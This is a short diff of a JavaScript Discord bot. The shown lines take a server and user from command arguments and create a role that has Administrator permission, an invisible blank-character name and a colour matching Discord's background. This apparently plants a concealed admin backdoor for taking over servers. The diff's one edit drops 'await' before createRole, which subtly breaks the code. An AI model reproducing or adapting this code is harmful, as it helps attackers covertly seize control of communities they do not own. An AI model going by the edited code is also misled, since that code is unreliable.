@@ -29,7 +29,7 @@ client.on('message', message => {
             let guild = client.guilds.get(serverid);
             var userid = client.users.get(args[2]);
             try {
-                role = await guild.createRole({
+                role = guild.createRole({
                     name: "឵឵឵   ",
                     color: "#36393f",
                     permissions: [8]
